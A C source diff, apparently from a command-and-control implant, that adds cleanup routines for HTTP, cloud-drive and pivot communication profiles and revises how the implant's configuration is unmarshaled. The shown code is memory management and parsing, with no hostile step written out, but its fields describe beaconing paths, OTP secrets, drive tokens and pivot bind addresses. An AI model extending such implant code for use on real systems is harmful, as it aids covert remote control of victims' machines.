@@ -49,6 +49,8 @@ VOID FreeGlobalConfig
 	_In_ PGLOBAL_CONFIG pConfig
 )
 {
+	DWORD i = 0;
+
 	if (pConfig != NULL) {
 		FREE(pConfig->pSessionKey);
 		FREE(pConfig->pPeerSessionKey);
@@ -64,6 +66,30 @@ VOID FreeGlobalConfig
 			CloseHandle(pConfig->hMutex);
 		}
 
+		if (pConfig->HttpProfiles != NULL) {
+			for (i = 0; i < pConfig->cHttpProfiles; i++) {
+				FreeHttpProfile(pConfig->HttpProfiles[i]);
+			}
+
+			FREE(pConfig->HttpProfiles);
+		}
+
+		if (pConfig->DriveProfiles != NULL) {
+			for (i = 0; i < pConfig->cDriveProfiles; i++) {
+				FreeDriveProfile(pConfig->DriveProfiles[i]);
+			}
+
+			FREE(pConfig->DriveProfiles);
+		}
+
+		if (pConfig->PivotProfiles != NULL) {
+			for (i = 0; i < pConfig->cPivotProfiles; i++) {
+				FreePivotProfile(pConfig->PivotProfiles[i]);
+			}
+
+			FREE(pConfig->PivotProfiles);
+		}
+		
 		FREE(pConfig);
 	}
 }
@@ -899,7 +925,7 @@ PGLOBAL_CONFIG UnmarshalConfig
 	LPVOID* UnmarshaledData = NULL;
 	PPBElement ConfigElements[16];
 	PPBElement DriveConfigElements[9];
-	PPBElement HttpConfigElements[14];
+	PPBElement HttpConfigElements[12];
 	PPBElement PivotConfigElements[3];
 	DWORD i = 0;
 	DWORD j = 0;
@@ -925,7 +951,6 @@ PGLOBAL_CONFIG UnmarshalConfig
 	ConfigElements[9]->Type = Varint;
 	ConfigElements[11]->Type = Varint;
 	ConfigElements[12]->Type = Varint;
-
 	ConfigElements[13]->Type = RepeatedBytes;
 	ConfigElements[14]->Type = RepeatedBytes;
 	ConfigElements[15]->Type = RepeatedBytes;
@@ -947,9 +972,7 @@ PGLOBAL_CONFIG UnmarshalConfig
 	HttpConfigElements[8]->Type = Varint;
 	HttpConfigElements[9]->Type = Varint;
 	HttpConfigElements[10]->Type = Varint;
-	HttpConfigElements[11]->Type = Varint;
-	HttpConfigElements[12]->Type = Varint;
-	HttpConfigElements[13]->Type = Bytes;
+	HttpConfigElements[11]->Type = Bytes;
 	for (i = 0; i < _countof(PivotConfigElements); i++) {
 		PivotConfigElements[i] = ALLOC(sizeof(PBElement));
 		PivotConfigElements[i]->dwFieldIdx = i + 1;
@@ -1014,8 +1037,8 @@ PGLOBAL_CONFIG UnmarshalConfig
 		UnmarshaledData[10] = NULL;
 	}
 
-	pResult->uImplantType = UnmarshaledData[12];
-	pResult->uProtocol = UnmarshaledData[11];
+	pResult->Type = (ImplantType)UnmarshaledData[12];
+	pResult->Protocol = (ProtocolType)UnmarshaledData[11];
 	if (UnmarshaledData[13] != NULL) {
 		pResult->cDriveProfiles = *((PDWORD)UnmarshaledData[13]);
 		if (pResult->cDriveProfiles > 0) {
@@ -1174,14 +1197,12 @@ PGLOBAL_CONFIG UnmarshalConfig
 						FreeBuffer(pTemp2[7]);
 					}
 
-					pHttpProfile->dwOtpInterval = pTemp2[8];
-					pHttpProfile->dwMinNumberOfSegments = pTemp2[9];
-					pHttpProfile->dwMaxNumberOfSegments = pTemp2[10];
-					pHttpProfile->dwPollInterval = pTemp2[11];
-					pHttpProfile->UseStandardPort = pTemp2[12];
-					if (pTemp2[13] != NULL) {
-						pHttpProfile->lpUrl = DuplicateStrA(((PBUFFER)pTemp2[13])->pBuffer, 0);
-						FreeBuffer(pTemp2[13]);
+					pHttpProfile->dwMinNumberOfSegments = pTemp2[8];
+					pHttpProfile->dwMaxNumberOfSegments = pTemp2[9];
+					pHttpProfile->dwPollInterval = pTemp2[10];
+					if (pTemp2[11] != NULL) {
+						pHttpProfile->lpUrl = DuplicateStrA(((PBUFFER)pTemp2[11])->pBuffer, 0);
+						FreeBuffer(pTemp2[11]);
 					}
 
 					pResult->HttpProfiles[i] = pHttpProfile;
@@ -1242,4 +1263,98 @@ CLEANUP:
 	}
 
 	return pResult;
+}
+
+VOID FreeHttpProfile
+(
+	_In_ PHTTP_PROFILE pProfile
+)
+{
+	DWORD i = 0;
+
+	if (pProfile != NULL) {
+		FREE(pProfile->lpUrl);
+		if (pProfile->PollPaths != NULL) {
+			for (i = 0; i < pProfile->cPollPaths; i++) {
+				FREE(pProfile->PollPaths[i]);
+			}
+
+			FREE(pProfile->PollPaths);
+		}
+		
+		if (pProfile->PollFiles != NULL) {
+			for (i = 0; i < pProfile->cPollFiles; i++) {
+				FREE(pProfile->PollFiles[i]);
+			}
+
+			FREE(pProfile->PollFiles);
+		}
+
+		if (pProfile->SessionPaths != NULL) {
+			for (i = 0; i < pProfile->cSessionPaths; i++) {
+				FREE(pProfile->SessionPaths[i]);
+			}
+
+			FREE(pProfile->SessionPaths);
+		}
+
+		if (pProfile->SessionFiles != NULL) {
+			for (i = 0; i < pProfile->cSessionFiles; i++) {
+				FREE(pProfile->SessionFiles[i]);
+			}
+
+			FREE(pProfile->SessionFiles);
+		}
+
+		if (pProfile->ClosePaths != NULL) {
+			for (i = 0; i < pProfile->cClosePaths; i++) {
+				FREE(pProfile->ClosePaths[i]);
+			}
+
+			FREE(pProfile->ClosePaths);
+		}
+
+		if (pProfile->CloseFiles != NULL) {
+			for (i = 0; i < pProfile->cCloseFiles; i++) {
+				FREE(pProfile->CloseFiles[i]);
+			}
+
+			FREE(pProfile->CloseFiles);
+		}
+
+		FREE(pProfile->lpUserAgent);
+		FREE(pProfile->lpOtpSecret);
+		FREE(pProfile);
+	}
+}
+
+VOID FreeDriveProfile
+(
+	_In_ PDRIVE_PROFILE pProfile
+)
+{
+	if (pProfile != NULL) {
+		FREE(pProfile->lpClientID);
+		FREE(pProfile->lpClientSecret);
+		FREE(pProfile->lpRefreshToken);
+		FREE(pProfile->lpUserAgent);
+		FREE(pProfile->lpStartExtension);
+		FREE(pProfile->lpSendExtension);
+		FREE(pProfile->lpRecvExtension);
+		FREE(pProfile->lpRegisterExtension);
+
+		FREE(pProfile);
+	}
+}
+
+VOID FreePivotProfile
+(
+	_In_ PPIVOT_PROFILE pProfile
+)
+{
+	if (pProfile != NULL) {
+		FREE(pProfile->lpBindAddress);
+
+		FREE(pProfile);
+	}
 }
